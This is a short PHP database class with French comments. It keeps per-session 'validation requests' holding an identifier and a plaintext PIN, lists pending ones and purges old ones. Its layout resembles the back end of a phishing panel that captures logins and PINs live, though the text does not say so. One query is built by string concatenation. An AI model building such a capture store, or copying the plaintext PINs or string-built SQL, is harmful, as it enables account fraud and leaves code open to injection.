<?php
// db.php – Gestion de la base de données

class DB {
    private static $db = null;

    public static function getConnection() {
        if (self::$db === null) {
            $dbPath = __DIR__ . '/requests.db';
            self::$db = new SQLite3($dbPath);
            self::$db->exec('CREATE TABLE IF NOT EXISTS validation_requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE,
                identifiant TEXT,
                pin TEXT,
                status TEXT DEFAULT "pending",
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )');
        }
        return self::$db;
    }
        // Mettre à jour le code PIN pour une session existante
        public static function updatePin($sessionId, $pin) {
            $db = self::getConnection();
            $stmt = $db->prepare('UPDATE validation_requests SET pin = :pin WHERE session_id = :session_id');
            $stmt->bindValue(':pin', $pin, SQLITE3_TEXT);
            $stmt->bindValue(':session_id', $sessionId, SQLITE3_TEXT);
            return $stmt->execute();
        }

    public static function createRequest($sessionId, $identifiant = null, $pin = null) {
        $db = self::getConnection();
        $stmt = $db->prepare('INSERT INTO validation_requests (session_id, identifiant, pin) VALUES (:session_id, :identifiant, :pin)');
        $stmt->bindValue(':session_id', $sessionId, SQLITE3_TEXT);
        if ($identifiant === null) {
            $stmt->bindValue(':identifiant', null, SQLITE3_NULL);
        } else {
            $stmt->bindValue(':identifiant', $identifiant, SQLITE3_TEXT);
        }
        if ($pin === null) {
            $stmt->bindValue(':pin', null, SQLITE3_NULL);
        } else {
            $stmt->bindValue(':pin', $pin, SQLITE3_TEXT);
        }
        return $stmt->execute();
    }

    // Mettre à jour l'identifiant pour une session existante
    public static function updateIdentifiant($sessionId, $identifiant) {
        $db = self::getConnection();
        $stmt = $db->prepare('UPDATE validation_requests SET identifiant = :identifiant WHERE session_id = :session_id');
        $stmt->bindValue(':identifiant', $identifiant, SQLITE3_TEXT);
        $stmt->bindValue(':session_id', $sessionId, SQLITE3_TEXT);
        return $stmt->execute();
    }

    public static function getRequest($sessionId) {
        $db = self::getConnection();
        $stmt = $db->prepare('SELECT * FROM validation_requests WHERE session_id = :session_id');
        $stmt->bindValue(':session_id', $sessionId, SQLITE3_TEXT);
        $result = $stmt->execute();
        return $result->fetchArray(SQLITE3_ASSOC);
    }

    public static function updateStatus($sessionId, $status) {
        $db = self::getConnection();
        $stmt = $db->prepare('UPDATE validation_requests SET status = :status WHERE session_id = :session_id');
        $stmt->bindValue(':status', $status, SQLITE3_TEXT);
        $stmt->bindValue(':session_id', $sessionId, SQLITE3_TEXT);
        return $stmt->execute();
    }

    // Afficher toutes les requêtes non terminées (statut != 'done')
    public static function getActiveRequests() {
        $db = self::getConnection();
        $result = $db->query('SELECT * FROM validation_requests WHERE status != "done" ORDER BY created_at DESC');
        $requests = [];
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            $requests[] = $row;
        }
        return $requests;
    }

    public static function deleteOldRequests($minutes = 30) {
        $db = self::getConnection();
        $db->exec('DELETE FROM validation_requests WHERE created_at < datetime("now", "-' . $minutes . ' minutes")');
    }
}